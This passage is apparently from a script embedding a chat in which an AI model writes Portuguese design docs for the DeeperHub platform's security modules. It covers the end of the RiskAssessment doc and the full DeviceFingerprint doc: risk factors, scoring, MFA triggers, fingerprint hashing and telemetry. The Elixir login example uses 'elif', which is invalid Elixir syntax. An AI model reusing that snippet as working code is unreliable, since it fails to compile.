    *   Módulo funcional que aplica pesos (obtidos de `SecurityPolicyManager`) aos fatores de risco e calcula a pontuação final.
    *   Determina o nível de risco com base em limiares configurados.
6.  **`DeeperHub.Security.RiskAssessment.Services.RiskActionRecommender`:**
    *   Módulo funcional ou GenServer que, com base no nível de risco, tipo de operação e políticas, sugere um conjunto de ações (ex: `[:require_mfa, :notify_user]`).
7.  **`DeeperHub.Security.RiskAssessment.Services.RiskWeightCalibrator` (Opcional):**
    *   GenServer para gerenciar e potencialmente auto-ajustar os pesos dos fatores de risco.
8.  **`DeeperHub.Security.RiskAssessment.Metrics.RiskMetricsCollector` (GenServer):**
    *   Coleta e agrega métricas sobre as avaliações de risco.
9.  **Schemas (Persistência):**
    *   `DeeperHub.Security.RiskAssessment.Schemas.RiskProfile`: Para armazenar o perfil de risco de cada usuário.
    *   `DeeperHub.Security.RiskAssessment.Schemas.RiskAssessmentLog`: Para armazenar o histórico de avaliações de risco.
10. **Configurações (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Define pesos, limiares, regras de ação, etc.

### 3.2. Estrutura de Diretórios (Consistente com a anterior)

```
lib/deeper_hub/security/risk_assessment/
├── risk_assessment.ex                # Fachada Pública
│
├── services/
│   ├── default_risk_assessment_service.ex
│   ├── risk_factor_calculator.ex
│   ├── advanced_risk_factors.ex
│   ├── risk_calculator_service.ex
│   ├── risk_action_recommender.ex
│   └── risk_weight_calibrator.ex     # Opcional
│
├── metrics/
│   └── risk_metrics_collector.ex
│
├── schemas/
│   ├── risk_profile.ex
│   └── risk_assessment_log.ex
│
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Baseado em Evidências:** A avaliação de risco deve ser baseada em múltiplos pontos de dados e evidências, não em um único fator.
*   **Ponderação Configurável:** A importância de cada fator de risco deve ser configurável para adaptar o sistema a diferentes cenários e tolerâncias a risco.
*   **Explicabilidade:** O sistema deve ser capaz de fornecer (pelo menos para administradores) os fatores que contribuíram para uma determinada pontuação de risco.
*   **Ciclo de Feedback:** Mecanismos para ajustar o modelo de risco com base em resultados (fraudes reais, falsos positivos) são importantes para a melhoria contínua.

## 🛠️ 4. Casos de Uso Principais

*   **Avaliação de Risco de Login:**
    *   `DeeperHub.Auth` solicita uma avaliação de risco para uma tentativa de login.
    *   `RiskAssessment` considera: IP (novo, reputação), dispositivo (novo, confiável), localização (usual, viagem impossível), horário (usual), histórico de tentativas falhas, score de anomalia comportamental.
    *   Retorna um score e ações (ex: permitir, exigir MFA).
*   **Avaliação de Risco de Mudança de Senha:**
    *   `DeeperHub.Accounts` solicita avaliação antes de permitir a mudança de senha.
    *   `RiskAssessment` considera: sessão atual (MFA verificado recentemente?), IP/dispositivo da solicitação, se a senha antiga foi fornecida corretamente.
    *   Pode recomendar notificação ao usuário em todos os casos, e MFA se o risco for médio/alto.
*   **Avaliação de Risco de uma Transação de Alto Valor (Exemplo):**
    *   Um módulo financeiro solicita avaliação.
    *   `RiskAssessment` considera: valor da transação (vs. histórico), destinatário (novo, conhecido), frequência de transações, score de anomalia comportamental do usuário.
    *   Pode recomendar bloqueio temporário e revisão manual.

## 🌊 5. Fluxos Importantes

### Fluxo de Avaliação de Risco Genérico (`assess_risk/4`)

1.  **Solicitação:** Um módulo chama `DeeperHub.Security.RiskAssessment.assess_risk(user_id, operation_type, operation_data, context_data)`.
2.  **`DefaultRiskAssessmentService`:**
    *   **Coleta de Dados:**
        *   Obtém perfil de risco do `user_id` (se existir).
        *   Obtém dados de `LoginLocation`, `DeviceFingerprint`, `BehavioralAnalysis` relacionados ao `user_id` e `context_data`.
    *   **Cálculo de Fatores:**
        *   Chama `RiskFactorCalculator` para calcular fatores básicos (ex: `ip_is_known`, `device_is_trusted`).
        *   Chama `AdvancedRiskFactors` para calcular fatores complexos (ex: `behavioral_score`, `geo_velocity_score`).
    *   **Cálculo de Score:**
        *   Envia a lista de `{fator, valor}` para `RiskCalculatorService`.
        *   `RiskCalculatorService` obtém os pesos dos fatores (de `SecurityPolicyManager`) e calcula a pontuação de risco agregada e o nível de risco.
    *   **Recomendação de Ação:**
        *   Envia o `operation_type` e `risk_level` para `RiskActionRecommender`.
        *   `RiskActionRecommender` consulta as políticas (de `SecurityPolicyManager`) e retorna uma lista de ações (ex: `[:allow, :log_medium_risk]`).
    *   **Registro e Atualização:**
        *   Registra a avaliação completa (fatores, score, ações) no `RiskAssessmentLog`.
        *   (Opcional) Enfileira uma atualização para o `RiskProfile` do usuário.
    *   **Resposta:** Retorna o `RiskAssessmentResult.t()` para o chamador.

## 📡 6. API (Funções Públicas da Fachada)

*(Baseado no que já foi documentado e consolidado)*

### 6.1. `DeeperHub.Security.RiskAssessment.assess_risk(user_id :: String.t() | nil, operation_type :: atom(), operation_data :: map(), context_data :: map(), opts :: keyword()) :: {:ok, RiskAssessmentResult.t()} | {:error, term()}`

*   **Descrição:** Avalia o risco de uma operação, considerando o usuário, tipo de operação, dados específicos da operação e contexto.
*   **`operation_type`:** Ex: `:login`, `:password_change`, `:email_update`, `:api_access_resource_x`, `:financial_transaction`.
*   **`operation_data`:** Mapa com dados relevantes para a `operation_type` (ex: para `:financial_transaction`, `%{amount: 100.0, currency: \"USD\", recipient_account: \"...\"}`).
*   **`context_data`:** Mapa com dados contextuais (ex: `%{ip_address: \"1.2.3.4\", user_agent: \"...\", session_id: \"...\", device_fingerprint: \"...\"}`).
*   **`opts`:** Opções adicionais, como `:force_recalculation` (ignorar cache de perfil de risco).
*   **`RiskAssessmentResult.t()`:** `%{risk_score: float(), risk_level: atom(), recommended_actions: list(atom()), contributing_factors: list(%{factor: atom(), value: term(), score_impact: float()}), assessment_id: String.t()}`.

### 6.2. `DeeperHub.Security.RiskAssessment.get_user_risk_profile(user_id :: String.t(), opts :: keyword()) :: {:ok, UserRiskProfile.t()} | {:error, :not_found | term()}`

*   **Descrição:** Obtém o perfil de risco atual de um usuário.
*   **`UserRiskProfile.t()`:** Mapa contendo dados como `%{average_login_risk: float(), last_high_risk_event_at: DateTime.t() | nil, typical_locations: list(map()), known_devices: list(String.t()), behavioral_baseline_summary: map()}`.

### 6.3. `DeeperHub.Security.RiskAssessment.get_assessment_details(assessment_id :: String.t()) :: {:ok, RiskAssessmentLog.t()} | {:error, :not_found | term()}` (Nova Sugestão)

*   **Descrição:** Recupera os detalhes completos de uma avaliação de risco específica pelo seu ID.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :risk_assessment, :enabled]`** (Boolean): Habilita/desabilita o módulo.
*   **`[:security, :risk_assessment, :default_weights, <factor_name>]`** (Float): Peso padrão para cada fator de risco.
    *   Ex: `[:security, :risk_assessment, :default_weights, :ip_reputation_score] = 0.15`
*   **`[:security, :risk_assessment, :risk_level_thresholds]`** (Map): Mapeamento de scores para níveis.
    *   Ex: `%{critical: 90, high: 70, medium: 40, low: 20}` (scores acima do valor são o nível).
*   **`[:security, :risk_assessment, :action_policies]`** (List de Maps): Regras para mapear `operation_type` e `risk_level` para `recommended_actions`.
    *   Ex: `%{operation_type: :login, risk_level: :high, actions: [:challenge_mfa, :notify_user]}`
*   **`[:security, :risk_assessment, :profile_history_days]`** (Integer): Quantos dias de dados usar para construir/atualizar perfis de risco.
*   **`[:security, :risk_assessment, :log_retention_days]`** (Integer): Retenção para logs de avaliação de risco.
*   **`[:security, :risk_assessment, :factors_enabled, <factor_name>]`** (Boolean): Habilita/desabilita fatores de risco específicos.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Essencial para obter pesos, limiares e regras de ação.
*   `DeeperHub.Security.LoginLocation`, `DeeperHub.Security.DeviceFingerprint`, `DeeperHub.Security.BehavioralAnalysis`: Fornecedores chave de fatores de risco.
*   `DeeperHub.Security.FraudDetection`: Pode ser tanto um consumidor dos resultados do RiskAssessment quanto um provedor de um fator de risco (\"fraude detectada anteriormente\").
*   `DeeperHub.Accounts`: Para dados de usuário.
*   `DeeperHub.MFA`: Para executar ações como `:require_mfa`.
*   `DeeperHub.Audit`: Para logar as avaliações.

### 8.2. Bibliotecas Externas

*   Nenhuma dependência externa direta crucial para o orquestrador, mas os módulos de cálculo de fatores (`AdvancedRiskFactors`) podem usar bibliotecas de ML/estatística.

## 🤝 9. Como Usar / Integração

O `RiskAssessment` é tipicamente chamado por outros módulos de segurança ou de domínio antes de permitir operações sensíveis.

**Exemplo em `DeeperHub.Auth` durante o login:**
```elixir
# Dentro do fluxo de login, após a verificação primária da senha
context_data = %{ip_address: ip, device_fingerprint: fp, user_agent: ua}
case DeeperHub.Security.RiskAssessment.assess_risk(user.id, :login, %{}, context_data) do
  {:ok, %{recommended_actions: actions}} ->
    if :block in actions do
      {:error, :login_blocked_high_risk}
    elif :challenge_mfa in actions and UserMFASettings.is_enabled?(user.id) do
      {:error, :mfa_required_due_to_risk} # Sinaliza para o frontend iniciar fluxo MFA
    else
      # Prosseguir com a criação da sessão
      # ...
    end
  {:error, _reason} ->
    # Falha segura: talvez negar ou exigir MFA se o risk assessment falhar
    Logger.error(\"Falha na avaliação de risco do login para user_id: #{user.id}\")
    {:error, :mfa_required_risk_assessment_failed} 
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a orquestração do `DefaultRiskAssessmentService` com mocks para os calculadores de fatores e recomendador de ações.
*   Testar cada serviço (`RiskFactorCalculator`, `AdvancedRiskFactors`, `RiskCalculatorService`, `RiskActionRecommender`) individualmente com diversos cenários de entrada.
*   Testar a lógica de persistência e recuperação de `RiskProfile` e `RiskAssessmentLog`.
*   Localização: `test/deeper_hub/security/risk_assessment/`.

### 10.2. Métricas

*   `deeper_hub.security.risk_assessment.evaluations.count` (tags: `operation_type`, `resulting_risk_level`)
*   `deeper_hub.security.risk_assessment.evaluation.duration_ms` (Histograma, tags: `operation_type`)
*   `deeper_hub.security.risk_assessment.factor_calculation.duration_ms` (Histograma, tags: `factor_name`)
*   `deeper_hub.security.risk_assessment.actions_taken.count` (tags: `operation_type`, `action_taken`, `original_risk_level`)
*   `deeper_hub.security.risk_assessment.profiles.updated.count` (Contador)

### 10.3. Logs

*   **Nível DEBUG:** Valores detalhados de cada fator de risco calculado durante uma avaliação.
*   **Nível INFO:** Resultado de cada avaliação de risco (score, nível, ações recomendadas, ID da avaliação).
*   **Nível WARNING:** Avaliações resultando em risco alto ou crítico, ou quando uma operação é bloqueada devido ao risco.
*   **Nível ERROR:** Falhas no processo de avaliação, incapacidade de calcular fatores essenciais.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :risk_assessment, :assess_operation, :start | :stop | :exception]`
    *   Metadados: `%{operation_type: type, user_id: id, context_keys: keys(context_data)}`
    *   No `:stop`: `%{risk_score: score, risk_level: level, recommended_actions: actions, assessment_id: id}`
*   `[:deeper_hub, :security, :risk_assessment, :factor_calculated]`
    *   Metadados: `%{assessment_id: id, factor_name: name, factor_value: value, score_contribution: contrib}`
*   `[:deeper_hub, :security, :risk_assessment, :action_recommended]`
    *   Metadados: `%{assessment_id: id, operation_type: type, risk_level: level, actions: actions}`

## ❌ 11. Tratamento de Erros

*   Se um fator de risco específico não puder ser calculado (ex: serviço de geolocalização offline), o sistema deve usar um valor padrão ou um peso neutro para esse fator, logar o problema e continuar a avaliação com os fatores disponíveis.
*   Uma falha completa no `RiskAssessmentService` deve ser tratada como um cenário de alto risco pelo chamador, aplicando a política de segurança mais restritiva (ex: negar a operação).

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Integridade dos Dados de Entrada:** O `RiskAssessment` confia nos dados fornecidos por outros módulos (IP, dispositivo, comportamento). A segurança desses módulos é indiretamente crucial.
*   **Segurança das Políticas de Risco:** As configurações de pesos, limiares e regras de ação são críticas e devem ser protegidas contra acesso não autorizado (responsabilidade do `SecurityPolicyManager`).
*   **Manipulação de Perfil:** Um invasor não deve ser capaz de manipular seu perfil de risco para parecer de baixo risco. A atualização dos perfis deve ser um processo controlado.

## 🧑‍💻 13. Contribuição

*   A adição de novos fatores de risco deve ser acompanhada de uma análise de seu impacto potencial e da disponibilidade/confiabilidade dos dados necessários.
*   As regras de recomendação de ação devem ser claras e cobrir todos os níveis de risco e tipos de operação relevantes.
*   Mantenha a lógica de cálculo de fatores e de pontuação o mais transparente e testável possível.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar aprendizado de máquina para otimizar dinamicamente os pesos dos fatores de risco e identificar novos padrões de risco.
*   [ ] Adicionar capacidade de simulação (\"what-if\") para testar o impacto de mudanças nas políticas de risco em dados históricos.
*   [ ] Desenvolver uma UI para visualização de perfis de risco, histórico de avaliações e ajuste manual de pesos/limiares por administradores.
*   [ ] Permitir a definição de \"contextos de risco\" personalizados (ex: \"período de alta promoção\", \"novo lançamento de feature\") que podem influenciar temporariamente os pesos ou limiares.
*   [ ] Integração com Threat Intelligence Feeds para enriquecer fatores de risco como reputação de IP.

---

*Última atualização: 2025-05-11*

---

O `RiskAssessment` é um módulo integrador bem interessante!

Qual o próximo? Talvez `DeeperHub.Security.DeviceFingerprint` e `DeeperHub.Security.GeoLocationService`, que são importantes provedores de fatores de risco? Ou prefere algo do Core, como `DeeperHub.Core.Cache`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos seguir com `DeeperHub.Security.DeviceFingerprint` e, em seguida, podemos abordar `DeeperHub.Security.GeoLocationService`, pois ambos são fontes importantes de informação para o `RiskAssessment`.

---

# Módulo: `DeeperHub.Security.DeviceFingerprint` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.DeviceFingerprint`

O módulo `DeeperHub.Security.DeviceFingerprint` é responsável por gerar, comparar e gerenciar \"fingerprints\" (impressões digitais) de dispositivos dos usuários. Uma fingerprint de dispositivo é um identificador quasi-único gerado a partir de uma combinação de características de hardware e software reportadas pelo cliente (navegador web, aplicativo mobile).

O objetivo principal é ajudar a identificar e rastrear dispositivos que acessam o sistema DeeperHub, contribuindo para várias medidas de segurança, como:
*   Detecção de acesso por dispositivos novos ou não reconhecidos.
*   Gerenciamento de dispositivos confiáveis.
*   Prevenção de fraude e tomada de contas (Account Takeover - ATO).
*   Enriquecimento de dados para análise de risco e comportamental.

Este módulo trabalha em conjunto com `DeeperHub.Security.DeviceService` (ou um componente similar dentro do `SecurityManager`) para associar fingerprints a dispositivos registrados e gerenciar seu status de confiança. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Geração de Fingerprint:**
    *   Coletar atributos do dispositivo do cliente (ex: User-Agent, resolução de tela, fontes instaladas, plugins, informações de hardware/software via APIs do navegador/SDK mobile).
    *   Processar e normalizar esses atributos.
    *   Gerar um hash estável (ex: SHA-256) a partir dos atributos combinados para servir como a fingerprint (`generate_fingerprint/1`).
*   **Comparação de Fingerprints:**
    *   Comparar duas fingerprints para determinar se provavelmente se referem ao mesmo dispositivo (`compare_fingerprints/2`).
    *   Considerar pequenas variações que podem ocorrer devido a atualizações de software ou navegador.
*   **Detecção de Anomalias de Fingerprint:**
    *   Comparar a fingerprint de uma sessão atual com o histórico de fingerprints conhecidas para o usuário (`detect_anomalies/3`).
    *   Sinalizar o uso de uma fingerprint completamente nova ou significativamente diferente.
*   **Verificação de Confiança de Fingerprint:**
    *   Verificar se uma fingerprint corresponde a um dispositivo previamente marcado como confiável pelo usuário (`is_trusted_fingerprint/2`).
*   **Integração com `DeviceService`:**
    *   Fornecer fingerprints para o `DeviceService` registrar novos dispositivos.
    *   Consultar o `DeviceService` para verificar o status de confiança de um dispositivo associado a uma fingerprint.
*   **Configurabilidade:**
    *   Permitir a configuração de quais atributos do dispositivo são usados na geração da fingerprint.
    *   Configurar a sensibilidade da comparação de fingerprints.
*   **Evolução e Estabilidade da Fingerprint:**
    *   Implementar estratégias para lidar com a evolução natural das fingerprints (ex: atualizações de navegador) sem gerar falsos positivos excessivos.

## 🏗️ 3. Arquitetura e Design

O `DeeperHub.Security.DeviceFingerprint` é primariamente um módulo funcional que fornece algoritmos e lógica para trabalhar com fingerprints. Ele não gerencia estado persistente de dispositivos diretamente, essa responsabilidade recai sobre o `DeviceService`.

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.DeviceFingerprint` (Módulo Funcional):**
    *   **Responsabilidade:** Contém as funções principais para `generate_fingerprint/1`, `compare_fingerprints/2`, `detect_anomalies/3`, `is_trusted_fingerprint/2`.
    *   **Interações:**
        *   Recebe `device_info` (um mapa de atributos coletados do cliente).
        *   Pode interagir com `DeeperHub.Security.DeviceService` ou `DeeperHub.Core.Repo` para buscar históricos de fingerprints de um usuário ou dispositivos confiáveis.
2.  **Coleta de Atributos no Cliente (Externo ao Módulo Backend):**
    *   A coleta real dos atributos do dispositivo ocorre no lado do cliente (JavaScript no navegador, SDK no mobile). Bibliotecas como FingerprintJS, ClientJS podem ser usadas.
    *   Esses atributos são enviados para o backend como parte das requisições (ex: login, ou uma chamada específica de \"registro de dispositivo\").
3.  **`DeeperHub.Security.DeviceService` (ou parte do `SecurityManager`):**
    *   **Responsabilidade:** Gerenciar a persistência dos dispositivos registrados, suas fingerprints associadas e seu status de confiança.
    *   **Interações:** Usa `DeviceFingerprint.generate_fingerprint/1` ao registrar um novo dispositivo. Armazena a fingerprint junto com os dados do dispositivo.

### 3.2. Estrutura de Diretórios (Proposta)

Como é um módulo mais focado em lógica e algoritmos, pode ser mais simples:
```
lib/deeper_hub/security/
├── device_fingerprint.ex           # Lógica principal de fingerprinting
└── device_service.ex               # (Ou security_manager/services/device_service.ex)
                                    #  Gerencia a entidade \"Device\" e seu estado
```
Ou, se `DeviceService` for um componente maior:
```
lib/deeper_hub/security/device_management/  # Novo submódulo
├── device_fingerprint.ex
├── device_service.ex
├── schema/
│   └── device.ex
└── supervisor.ex
```

### 3.3. Decisões de Design Importantes

*   **Seleção de Atributos:** A escolha dos atributos para compor a fingerprint é crucial. Devem ser estáveis o suficiente para não mudarem constantemente, mas diversos o suficiente para fornecer uma boa unicidade. Evitar atributos muito voláteis ou facilmente falsificáveis.
*   **Estabilidade vs. Unicidade:** Há um trade-off. Fingerprints mais únicas (usando mais atributos) tendem a ser menos estáveis (mudam mais frequentemente). Fingerprints mais estáveis podem ter maior chance de colisão.
*   **Hashing:** Usar um algoritmo de hash criptográfico seguro (ex: SHA-256) para gerar a fingerprint final.
*   **Privacidade:** Ser transparente com o usuário sobre a coleta de dados do dispositivo para fingerprinting. Não coletar mais dados do que o necessário.
*   **Não é Infalível:** Fingerprinting de dispositivo não é 100% à prova de falsificação ou evasão, mas é uma camada útil de segurança quando combinada com outras.

## 🛠️ 4. Casos de Uso Principais

*   **Detecção de Novo Dispositivo no Login:**
    *   Usuário tenta fazer login. O cliente envia `device_info`.
    *   O backend gera uma fingerprint usando `DeviceFingerprint.generate_fingerprint(device_info)`.
    *   `DeviceFingerprint.detect_anomalies(user_id, current_fingerprint, historical_fingerprints_from_db)` é chamado.
    *   Se a fingerprint for nova ou significativamente diferente, isso contribui para o score de risco do `RiskAssessment`.
*   **Registro de Dispositivo Confiável:**
    *   Após um login bem-sucedido, o usuário opta por \"confiar neste dispositivo\".
    *   O cliente envia `device_info`.
    *   O backend gera a fingerprint.
    *   `DeeperHub.Security.DeviceService.trust_device(user_id, fingerprint, device_name)` é chamado para armazenar a fingerprint como confiável.
*   **Pular MFA para Dispositivos Confiáveis:**
    *   Durante o login, se a fingerprint do dispositivo atual corresponder a uma fingerprint confiável para o usuário (`DeviceFingerprint.is_trusted_fingerprint/2`), o sistema pode optar por não exigir MFA, mesmo que configurado (dependendo da política de risco).

## 🌊 5. Fluxos Importantes

### Fluxo de Geração e Verificação de Fingerprint no Login

1.  **Coleta no Cliente:** JavaScript no navegador (ou SDK mobile) coleta atributos do dispositivo.
2.  **Envio para o Backend:** Os atributos são enviados para o backend durante a tentativa de login.
3.  **`DeeperHub.Auth.Services.LoginService` (ou `SecurityManager`):**
    *   Recebe `device_info` como parte dos dados de login.
    *   Chama `DeeperHub.Security.DeviceFingerprint.generate_fingerprint(device_info)` para obter a `current_fingerprint`.
4.  **`DeeperHub.Security.DeviceFingerprint.generate_fingerprint/1`:**
    *   Seleciona um subconjunto de atributos de `device_info` (configurável).
    *   Normaliza os valores (ex: lowercase, ordenação).
    *   Concatena os valores normalizados em uma string.
    *   Calcula o hash (ex: SHA-256) da string concatenada.
    *   Retorna o hash como a fingerprint.
5.  **`DeeperHub.Auth.Services.LoginService` (ou `SecurityManager`):**
    *   Recupera as fingerprints históricas e confiáveis para o `user_id` do `DeviceService` (que consulta o DB).
    *   Chama `DeeperHub.Security.DeviceFingerprint.is_trusted_fingerprint(current_fingerprint, trusted_fingerprints_for_user)`.
    *   Chama `DeeperHub.Security.DeviceFingerprint.detect_anomalies(user_id, current_fingerprint, historical_fingerprints)`.
    *   Os resultados (`is_trusted`, `is_new_device`) são passados para `DeeperHub.Security.RiskAssessment` como fatores de risco.
6.  **(Pós-Login bem-sucedido, se o dispositivo for novo e o usuário optar por registrar/confiar):**
    *   `DeeperHub.Security.DeviceService.register_or_update_device(user_id, current_fingerprint, device_info_attributes, is_trusted: true)`.

## 📡 6. API (Funções Públicas do Módulo)

### 6.1. `DeeperHub.Security.DeviceFingerprint.generate_fingerprint(device_info :: map()) :: {:ok, String.t()} | {:error, :missing_attributes | term()}`

*   **Descrição:** Gera uma fingerprint de dispositivo a partir de um mapa de atributos.
*   **`device_info`:** Mapa contendo atributos coletados do cliente (ex: `%{user_agent: \"...\", screen_resolution: \"1920x1080\", timezone: \"America/New_York\", plugins: [\"...\", \"...\"], canvas_fingerprint: \"...\", ...}`).
*   **Retorno:**
    *   `{:ok, fingerprint_string}`: A fingerprint gerada.
    *   `{:error, :missing_attributes}`: Se atributos essenciais para a geração não forem fornecidos.
    *   `{:error, reason}`: Outros erros.
*   **Exemplo:**
    ```elixir
    device_attrs = %{user_agent: \"...\", screen_width: 1920, screen_height: 1080}
    {:ok, fp} = DeeperHub.Security.DeviceFingerprint.generate_fingerprint(device_attrs)
    ```

### 6.2. `DeeperHub.Security.DeviceFingerprint.compare_fingerprints(fp1 :: String.t(), fp2 :: String.t(), opts :: keyword()) :: {:ok, :match | :partial_match | :no_match, float() | nil}`

*   **Descrição:** Compara duas fingerprints e retorna o nível de correspondência.
*   **`opts`:**
    *   `:sensitivity` (Float): Limiar para considerar `partial_match` (0.0 a 1.0).
*   **Retorno:**
    *   `{:ok, :match, 1.0}`: Correspondência exata.
    *   `{:ok, :partial_match, score}`: Correspondência parcial com um score de similaridade.
    *   `{:ok, :no_match, score}`: Nenhuma correspondência.
*   *(Nota: A implementação de `partial_match` pode ser complexa e depender de algoritmos de similaridade de string ou análise dos atributos que diferem.)*

### 6.3. `DeeperHub.Security.DeviceFingerprint.detect_anomalies(user_id :: String.t(), current_fingerprint :: String.t(), historical_fingerprints :: list(String.t())) :: {:ok, %{is_new_device: boolean(), is_significantly_different: boolean(), confidence: float()}}`

*   **Descrição:** Compara a fingerprint atual com um conjunto de fingerprints históricas do usuário.
*   **Retorno:**
    *   `is_new_device`: `true` se `current_fingerprint` não estiver em `historical_fingerprints`.
    *   `is_significantly_different`: `true` se `current_fingerprint` for nova e/ou muito diferente das históricas (usando `compare_fingerprints`).
    *   `confidence`: Confiança na detecção da anomalia.

### 6.4. `DeeperHub.Security.DeviceFingerprint.is_trusted_fingerprint(user_id :: String.t(), current_fingerprint :: String.t()) :: boolean()`

*   **Descrição:** Verifica se a `current_fingerprint` corresponde a alguma fingerprint de um dispositivo marcado como confiável para o `user_id`.
*   **(Delegação):** Esta função provavelmente chamaria `DeeperHub.Security.DeviceService.list_trusted_devices(user_id)` e então compararia as fingerprints.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :device_fingerprint, :enabled]`** (Boolean): Habilita/desabilita o sistema de fingerprinting. (Padrão: `true`)
*   **`[:security, :device_fingerprint, :attributes_to_use]`** (List de Atoms/Strings): Lista de chaves de `device_info` que serão usadas para gerar a fingerprint.
    *   Ex: `[:user_agent, :screen_resolution, :timezone, :language, :platform, :canvas_hash]`
*   **`[:security, :device_fingerprint, :hash_algorithm]`** (Atom): Algoritmo de hash a ser usado (ex: `:sha256`). (Padrão: `:sha256`)
*   **`[:security, :device_fingerprint, :comparison_sensitivity]`** (Float): Limiar de sensibilidade para `compare_fingerprints/2` ao considerar uma correspondência parcial. (Padrão: `0.85`)
*   **`[:security, :device_fingerprint, :new_device_risk_penalty]`** (Integer): Penalidade de risco a ser adicionada ao `RiskAssessment` quando um novo dispositivo é detectado.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configurações.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.Metrics`: Para métricas.
*   `DeeperHub.Security.DeviceService` (ou componente do `SecurityManager`): Para persistir e consultar dispositivos registrados e seu status de confiança.
*   `DeeperHub.Shared.Utils.SecurityUtils` (ou `Core.EncryptionService` se a fingerprint em si precisar ser hasheada de uma forma específica, embora geralmente o resultado do hash dos atributos já seja a fingerprint).

### 8.2. Bibliotecas Externas

*   Nenhuma dependência externa direta é estritamente necessária para a geração do hash em si (Erlang `:crypto` pode ser usado). Bibliotecas de parsing de User-Agent podem ser úteis se essa informação for usada de forma mais granular.

## 🤝 9. Como Usar / Integração

*   **Coleta no Frontend/Mobile:** Implementar a coleta dos atributos do dispositivo no cliente.
*   **Envio para Backend:** Enviar o mapa `device_info` para os endpoints relevantes do backend (ex: login, registro de dispositivo).
*   **No Backend:**
    ```elixir
    def handle_login(params, user_id) do
      device_info = Map.get(params, \"device_info\", %{})
      {:ok, current_fp} = DeeperHub.Security.DeviceFingerprint.generate_fingerprint(device_info)
      
      is_trusted = DeeperHub.Security.DeviceFingerprint.is_trusted_fingerprint(user_id, current_fp)
      # Ou, melhor, via DeviceService:
      # {:ok, device_status} = DeeperHub.Security.DeviceService.get_device_status_by_fp(user_id, current_fp)
      # is_trusted = device_status == :trusted

      # Passar current_fp, is_trusted para RiskAssessment
      # ...
    end
    ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a geração de fingerprints com diferentes conjuntos de `device_info`.
*   Testar a estabilidade da fingerprint (pequenas mudanças em `device_info` não devem sempre gerar uma nova fingerprint, dependendo dos atributos usados).
*   Testar a comparação de fingerprints (exata, nenhuma).
*   Testar a detecção de anomalias (novo dispositivo vs. dispositivo conhecido).
*   Localização: `test/deeper_hub/security/device_fingerprint/`.

### 10.2. Métricas

*   `deeper_hub.security.device_fingerprint.generated.count`
*   `deeper_hub.security.device_fingerprint.comparisons.count` (tags: `result` (`match`, `no_match`))
*   `deeper_hub.security.device_fingerprint.anomalies_detected.count` (tags: `type` (`new_device`))
*   `deeper_hub.security.device_fingerprint.trusted_checks.count` (tags: `result` (`trusted`, `not_trusted`))

### 10.3. Logs

*   **Nível DEBUG:** Detalhes dos atributos usados para gerar uma fingerprint específica.
*   **Nível INFO:** Nova fingerprint detectada para um usuário. Fingerprint verificada como confiável.
*   **Nível WARNING:** Falha ao gerar fingerprint devido a atributos ausentes.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :device_fingerprint, :generation, :start | :stop | :exception]`
    *   Metadados: `%{input_attribute_keys: keys(device_info)}`
    *   No `:stop`: `%{fingerprint: fp_string}`
*   `[:deeper_hub, :security, :device_fingerprint, :anomaly_check, :stop]`
    *   Metadados: `%{user_id: id, current_fp: fp, result: %{is_new: ...}}`

## ❌ 11. Tratamento de Erros

*   Falha na coleta de atributos no cliente: O sistema deve lidar graciosamente com `device_info` incompleto ou ausente, possivelmente atribuindo um risco maior ou usando uma fingerprint genérica/nula.
*   Se a geração da fingerprint falhar no backend, isso deve ser logado, e a avaliação de risco pode prosseguir sem esse fator ou com um fator de risco de \"dispositivo desconhecido\".

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Não Confiar Cegamente na Fingerprint:** Fingerprints de dispositivo podem ser falsificadas ou contornadas por atacantes determinados. Elas devem ser usadas como *um* dos muitos sinais em uma estratégia de defesa em profundidade, não como o único mecanismo de identificação de dispositivo.
*   **Rotação de Atributos:** Alguns atributos usados na fingerprint podem mudar com o tempo (ex: versão do navegador). O algoritmo deve ser robusto a pequenas mudanças ou ter uma estratégia para \"envelhecer\" ou \"agrupar\" fingerprints similares.
*   **Armazenamento de Fingerprints:** Embora a fingerprint seja um hash, se muitas fingerprints históricas de um usuário forem comprometidas, elas poderiam, teoricamente, ser usadas para tentar adivinhar alguns dos atributos do dispositivo.

## 🧑‍💻 13. Contribuição

*   A escolha dos atributos em `[:security, :device_fingerprint, :attributes_to_use]` é crítica e deve ser balanceada entre unicidade e estabilidade.
*   Documentar claramente quais atributos são esperados do cliente.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar algoritmos mais sofisticados para `compare_fingerprints/2` que possam dar um score de similaridade baseado nos atributos que diferem, em vez de apenas correspondência exata do hash.
*   [ ] Adicionar um mecanismo para \"aprender\" e \"envelhecer\" fingerprints, permitindo que mudanças graduais no dispositivo de um usuário não o classifiquem imediatamente como \"novo\".
*   [ ] Integrar com bibliotecas de fingerprinting de servidor que podem inferir alguns atributos do dispositivo a partir dos headers da requisição HTTP, como um fallback ou complemento.
